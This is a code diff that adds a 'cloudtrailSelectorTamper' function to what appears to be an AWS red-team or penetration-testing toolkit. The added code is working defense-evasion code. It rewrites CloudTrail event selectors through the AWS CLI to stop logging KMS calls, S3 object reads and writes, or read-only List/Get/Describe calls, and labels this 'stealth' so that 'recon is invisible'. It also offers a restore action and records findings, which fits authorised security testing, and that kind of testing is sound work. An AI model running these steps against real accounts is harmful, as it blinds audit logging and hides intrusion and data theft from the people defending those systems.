@@ -1176,3 +1176,121 @@ export async function s3LoggingDisable(args: string[], timeout: number): Promise
 
   return { output: output.join("\n"), findings }
 }
+
+export async function cloudtrailSelectorTamper(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action")
+  if (!action) return { output: "ERROR: --action required (status|exclude_kms|exclude_s3_data|management_read_only|restore)", findings: [] }
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const trailName = argVal(args, "--trail-name")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] CloudTrail Event Selector Manipulation (stealth)\n"]
+
+  const resolveTrail = async (): Promise<string | null> => {
+    if (trailName) return trailName
+    const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].Name"], profile, region, timeout)
+    const name = tryJson(r.stdout)
+    if (!name || r.exitCode !== 0) {
+      output.push("[-] No CloudTrail trails found")
+      return null
+    }
+    return name
+  }
+
+  if (action === "status") {
+    const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[].Name"], profile, region, timeout)
+    const trails = tryJson(r.stdout) || []
+    for (const t of trails) {
+      const sel = await aws(["cloudtrail", "get-event-selectors", "--trail-name", t], profile, region, timeout)
+      const data = tryJson(sel.stdout)
+      if (!data) continue
+      output.push(`[+] Trail: ${t}`)
+      const selectors = data.EventSelectors || []
+      for (const s of selectors) {
+        output.push(`    ReadWriteType: ${s.ReadWriteType}`)
+        output.push(`    IncludeManagementEvents: ${s.IncludeManagementEvents}`)
+        const excludes = s.ExcludeManagementEventSources || []
+        output.push(`    ExcludeManagementEventSources: ${excludes.length > 0 ? excludes.join(", ") : "(none)"}`)
+        const dataRes = s.DataResources || []
+        output.push(`    DataResources: ${dataRes.length > 0 ? dataRes.map((d: Record<string, string>) => d.Type).join(", ") : "(none)"}`)
+      }
+      const advanced = data.AdvancedEventSelectors || []
+      if (advanced.length > 0) output.push(`    AdvancedEventSelectors: ${advanced.length} rule(s)`)
+    }
+    return { output: output.join("\n"), findings }
+  }
+
+  const trail = await resolveTrail()
+  if (!trail) return { output: output.join("\n"), findings }
+
+  const current = await aws(["cloudtrail", "get-event-selectors", "--trail-name", trail], profile, region, timeout)
+  const currentData = tryJson(current.stdout)
+  const selectors = currentData?.EventSelectors || [{ ReadWriteType: "All", IncludeManagementEvents: true }]
+
+  if (action === "exclude_kms") {
+    const updated = selectors.map((s: Record<string, unknown>) => ({
+      ...s,
+      ExcludeManagementEventSources: ["kms.amazonaws.com"],
+    }))
+    const r = await aws(
+      ["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(updated)],
+      profile, region, timeout,
+    )
+    output.push(r.exitCode === 0
+      ? `[+] KMS operations excluded from ${trail} — KMS API calls no longer logged`
+      : `[-] Failed: ${r.stderr.slice(0, 200)}`)
+  }
+
+  if (action === "exclude_s3_data") {
+    const updated = selectors.map((s: Record<string, unknown>) => ({
+      ...s,
+      DataResources: [],
+    }))
+    const r = await aws(
+      ["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(updated)],
+      profile, region, timeout,
+    )
+    output.push(r.exitCode === 0
+      ? `[+] S3 data events removed from ${trail} — s3:GetObject/PutObject no longer logged`
+      : `[-] Failed: ${r.stderr.slice(0, 200)}`)
+  }
+
+  if (action === "management_read_only") {
+    const updated = selectors.map((s: Record<string, unknown>) => ({
+      ...s,
+      ReadWriteType: "WriteOnly",
+    }))
+    const r = await aws(
+      ["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(updated)],
+      profile, region, timeout,
+    )
+    output.push(r.exitCode === 0
+      ? `[+] Management events set to WriteOnly on ${trail} — List*/Get*/Describe* calls invisible`
+      : `[-] Failed: ${r.stderr.slice(0, 200)}`)
+    if (r.exitCode === 0) {
+      findings.push({
+        checkId: "AWS-EVASION-SELECTOR-001",
+        provider: "aws",
+        severity: "high",
+        status: "TAMPERED",
+        resource: trail,
+        title: "CloudTrail event selectors modified to WriteOnly",
+        details: "Read-only API calls (List, Get, Describe) are no longer logged — recon is invisible",
+        remediation: "Restore ReadWriteType to All",
+      })
+    }
+  }
+
+  if (action === "restore") {
+    const restored = [{ ReadWriteType: "All", IncludeManagementEvents: true, DataResources: [], ExcludeManagementEventSources: [] }]
+    const r = await aws(
+      ["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(restored)],
+      profile, region, timeout,
+    )
+    output.push(r.exitCode === 0
+      ? `[+] Event selectors restored to full logging on ${trail}`
+      : `[-] Failed: ${r.stderr.slice(0, 200)}`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
